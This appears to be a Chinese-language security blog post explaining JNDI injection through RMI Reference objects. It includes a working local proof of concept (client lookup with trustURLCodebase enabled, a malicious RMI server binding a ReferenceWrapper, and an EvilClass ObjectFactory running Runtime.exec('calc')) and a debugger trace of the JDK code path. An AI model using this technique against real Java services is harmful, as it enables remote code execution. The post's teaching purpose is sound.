---
title: JNDI注入再理解
tags:
  - JNDI
categories:
  - - 漏洞原理
abbrlink: 29b6e7bf
date: 2025-04-14 10:33:52
---
嗯，感觉以前对这个概念的理解不是很清楚，今天抽了时间再学习了学习。

JNDI提供了一个统一的接口屏蔽了一些协议负载的调用与使用过程，如RMI、LDAP、COBRA等，主要功能是实现了远程方法调用，针对JNID的攻击一般有以下两种，一种是注册在远程的对象由一些危险的方法，那么我们便可以直接使用注册中兴对外暴露的接口调用这些危险的方法来实现攻击，一类是我们可以直接在客户端向注册中心直接注册一个恶意对象，因为对象在传输过程中时序列化传输的，那么注册中心再加载该对象的时候会进行反序列化操作，那么如果我们的恶意对象的静态代码块中有一些危险操作那么便会直接被执行，因为静态代码块中的方法是在类加载过程中被调用的，且只会调用一次。
关于第一种情况，没什么好说的，只要我们能够远程调用接口便能完成攻击，当然是在你知道对方注册了什么危险对象的基础上。第二种情况也分多种情况，一是我们可以直接向远程注册恶意对象。二是我们可以利用JNDI的动态类加载机制完成攻击，一是利用CodeBase机制，如果客户端的lookup参数内容可控，那么我们便可以自行搭建一个注册中心，注册恶意类。那么客户端在调用的时候就会调用到我们的恶意对象，但是这有一个问题，如果是我们自行注册的恶意对象，那么客户端如果没有这个恶意类，客户端也是不会反序列化成功的，利用CodeBase机制我们可以在服务端指定恶意类的加载地址，当客户端请求该恶意对象的时候，客户端会一并将CodeBase指定的地址发送个客户端，如果客户端没有这个恶意类那么则会使用CodeBase指定的地址去加载恶意类，从而完成恶意类的自动调用。这里注意CodeBase是双向指定的，客户端可以指定，服务端也可以指定，当然优先使用的是服务端指定的地址。麻烦的是一些版本的JDK模式不允许CodeBase远程类加载，而且还涉及到java的安全管理器。另一种情况是利用JNDI Naming Reference，Reference类表示对存在于命名/目录系统以外的对象的引用，如果注册在注册中心的对象为Reference类的子类，那么再客户端获取到远程对象的存根实例的时候将使用Reference对象指定的远程地址与类名去加载恶意类从而完成攻击，可以注意到，这个攻击发生在客户端。因为Reference没有继承UnicastRemoteObject，所以我们需要对Reference类使用ReferenceWrapper对其进行包装，然后绑定在注册中心中才能实现远程调用。两种情况重点都是需要lookup函数参数可控，也就是可以指定远程服务器的位置，当然你如果可以操控对方远程服务器又另说。
这里我们介绍一下通过Reference类来实现JNDI注入，首先我们写一个客户端。
<!--more-->
```java
package com.armandhe.jnditest;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        InitialContext initialContext = new InitialContext();
        Object lookup = initialContext.lookup("rmi://127.0.0.1/hacked");
    }
}

```
> System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

这一行代码是为了避免高版本的JDK值允许在指定位置加载类的特性
然后我们写一个服务端
```java
package com.armandhe.jnditest;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class Server {
    public static void main(String[] args) throws RemoteException, NamingException, MalformedURLException {
        String className = "com.armandhe.jnditest.EvilClass";
        String url = "file://E:\\securityTools\\源码\\jnditest\\src\\main\\java\\com\\armandhe\\jnditest\\EvilClass.class";
        LocateRegistry.createRegistry(1099);
        Reference reference = new Reference(className, className, url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        Naming.rebind("hacked", referenceWrapper);
        System.out.println("rmi://127.0.0.1/hacked is working...");
    }
}

```
服务端就不起http服务器了，我们通过file协议将远程类的地址设置为本地文件系统，因为我的客户端与服务器在同一台机器上，所以这样也是可以的，然后声明一个注册中心，绑定一个端口，实例化一个Reference类，使用ReferenceWrapper对其进行包装，因为其继承了UnicastRemoteObject类，这样我们的Reference才能被远程调用
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/3f4e96c56945648fc75944c7e79c003f.png)

然后是我们的恶意类
```java
package com.armandhe.jnditest;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class EvilClass implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("calc");
        return null;
    }
}

```
在该类中我们集成了ObjectFactory类，重写了其getObjectInstance方法。
然后讲服务端与客户端分别运行起来，然后打断点进行调试
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/92ca44c08af8d3f8f8dc95bcbb1dc7f0.png)
首先调用的是InitialContext#lookup方法，该方法首先调用了其静态方法getURLOrDefaultIniCtx，获取了一个Context对象，该Context对象是GenericURLContext类的一个实例，然后调用其lookup方法，出入jndi表达式
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/dd088615137ff86c90161159605ab82d.png)
然后继续往下走进入到RegistryContext#lookup方法，该方法会调用decodeObject方法对远程对象进行解析，该方法接收两个参数，一个是我们远程获取的ReferenceWrapper对象，一个是我们的查询name，也就是hacked
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/664327f269b07c14eda517690151d4be.png)
方法体重首先会判断我们传入的对象是否是RemoteReference与Reference类的实例，然后进行强制类型转换为Reference对象，判断是否设置了远程类的位置，以及该地址是否是可信的CodeBase地址，这也是为什么我们最开始要设置com.sun.jndi.rmi.object.trustURLCodebase为true的原因，否则是不可能调用成功的。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/2ad184a640746724ee37cfee2f712d44.png)
方法体最终会调用NamingManager#getObjecInstance方法，传入我们的Reference对象与name

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9632a133680faef2d9e3996b90079db5.png)
该方法中重点在第330行与332行，在330行调用getObjectFactoryFromReference闯入Reference对象与f，f就是我们的恶意类的全类名，该方法中或实例化我们的恶意类。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/d3cecb586e66ba61b934f8750f559d30.png)
首先是在第148行获取了我们恶意类的Class对象，然后通过反射的方式对该类进行了实例化，所以我们的恶意类的恶意代码可以写在静态代码块、实例代码块、无参构造方法中。熟悉java类加载机制的都清楚，java的类夹杂核心方法为loadClass、defineClass、findClass，这已经很明显了
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0e380d2e8ab633810450f2c701af429e.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9b8b0f55bc77487f1ae605af4c268efe.png)
getObjectFactoryFromReference方法执行完成后会获得我们自定义的ObjectFactory对象，让后调用该对象的getObjectInstance方法，这也是我们的恶意代码可以写在该方法中的原因。
所以你注意到了吗，这种方式是不能绕过高版本JDK的trustURLCodebase机制的，所以有局限，那么要如何在高版本JDK使用这种方式注入呢，相比你已经很清楚了，我们之所以需要使用CodeBase是因为我们要加载的远程类在本地不存在，那么如果在客户端测存在我们要使用的恶意类不就完美的避免了CodeBase的保护机制了吗？所以我们下一章就去找一找这个tomcat或者JDK本地的危险Gadget









